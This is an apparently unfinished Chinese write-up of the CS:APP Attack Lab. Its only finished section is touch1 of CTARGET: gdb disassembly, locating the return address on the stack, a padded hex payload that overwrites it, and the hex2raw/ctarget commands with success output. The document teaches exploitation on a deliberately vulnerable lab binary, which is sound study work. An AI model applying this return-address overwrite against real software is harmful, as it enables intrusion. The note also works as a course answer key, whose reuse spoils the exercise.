# L3-Attack-Note

提示: 本笔记显式地包括答案, 如果你想自己独立完成该实验, 建议只阅读 **准备工作 ** 与 **题目说明** 部分.

目前未完成.

## 目录

1. 准备工作
2. 题目说明
3. Hex2raw 工具讲解
4. 题解: CTARGET 
   1. touch1
   2. touch 2
   3. touch 3
5. 题解: RTARGET 
   1. touch 2
   2. touch 3
6. 后记



## 准备工作

记得阅读 attack.pdf

其他暂略

## 题目说明

根据教材第三章... 我们需要对代码...

记得加 `-q` 

cookie 的含义

### Hex2raw 工具讲解



## 题解: CTARGET 

我们首先明确一下我们要干什么. 假设你已经阅读过教材 3.10.3 小结, 你应该知道我们的目标是利用缓冲区溢出来使得函数返回时返回至另外的. 出乎意料的, 由我们(攻击者)提供的函数地址上. 基本的原理不在这里多说.

下面的叙述均基于 CTARGET  为背景.

### touch1

**test函数**

这个函数是我们将攻击的代码, 在此小节以主函数称呼之. 我们通过 `getbuf` 函数输入一串字符, 理论上正常返回时会返回整型 `1` 储存在 `val`中 并打印, 退出. 

```c
void test(){
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```



下面来观察汇编代码

```
//test() 反汇编
Dump of assembler code for function test:
    0x0000000000401968 <+0>:	sub    $0x8,%rsp
    0x000000000040196c <+4>:	mov    $0x0,%eax
    0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
    0x0000000000401976 <+14>:	mov    %eax,%edx
    0x0000000000401978 <+16>:	mov    $0x403188,%esi
    0x000000000040197d <+21>:	mov    $0x1,%edi
    0x0000000000401982 <+26>:	mov    $0x0,%eax
    0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
    0x000000000040198c <+36>:	add    $0x8,%rsp
    0x0000000000401990 <+40>:	retq 
```



我们注意<+9> 这一行, `callq` 函数的操作对象是一个地址, 目前这个地址是指向到 `getbuf`函数

在`getbuf`结束后, 应当返回到 0x401976 地址, 称为原地址. 

我们的目标就是替换掉堆栈中的原地址, 将其修改为我们期望转到的 `touch1`函数的地址, 称为目标地址.

于是任务变成了:

1. 找到堆栈中原地址的储存位置
2. 确定目标地址的地址
3. 将原地址替换为目标地址

**getbuf 函数**

我们可以看到它的C代码如下

```c
unsigned getbuf(){
	char buf[BUFFER_SIZE];
	GETs(buf);
	return 1;
}
```

首先的问题是, 我们需要知道这个缓冲区设置有多长? 也就是`BUFF_SIZE` 的大小. 只有知道了这个的基础上, 才能确定堆栈中原地址的位置. 我们照例查看其汇编代码:

```
//getbuf()
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
```

我们注意到在代码开始处, 堆栈扩充了 0x28 个大小. 

这说明BUFF_SIZE可能是0x28

> 注: 这里使用可能二字, 因为我非常疑心BUFF_SIZE与栈帧的大小是否相同, 但是栈上移0x28位后是返回地址应该是没有异议的.

于是我们在 +12 设置一个断点, 并使用gdb的查看指令

```
//事先输入的字符串为 "abcdef"
(gdb) print (char*) ($rsp)
$1 = 0x5561dc78 "abcdef"
//可以看出, 堆栈的起始位置即储存了输入的字符串

(gdb) x/a ($rsp+0x28) 
0x5561dca0:	0x401976 <test+14>
//可以看出, 当我们试图查看 ($rsp+0x28) 储存的地址时, 发现正好时test+14的地址, 也就是我们的原地址. 
```

那么我们现在至于要使用目标地址替换原地址即可.

**touch1 函数**

```
//touch1 反汇编
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp
   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
```

显然目标地址就是 `0x4017c0`



因此, 我们应当输入的数字如下:

> 00 00 00 00 00 00 00 00 00 00 
>
> 00 00 00 00 00 00 00 00 00 00 
>
> 00 00 00 00 00 00 00 00 00 00 
>
> 00 00 00 00 00 00 00 00 00 00 
>
> c0 17 40 00 00 00 00 00 00 00 

上面的内容不能直接在`ctarget`运行时输入, 而要使用 `Hex2raw`工具处理. 具体请参看上面的  `Hex2raw` 讲解部分.

我们将上述材料存储在文件`in.txt`内, 并使用 `Hex2raw`工具将其转化为 二进制 文件并输入. 

```
//输入
./hex2raw  <in.txt> out
./ctarget -i out -q

//输出
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
```

说明我们已经过了第一关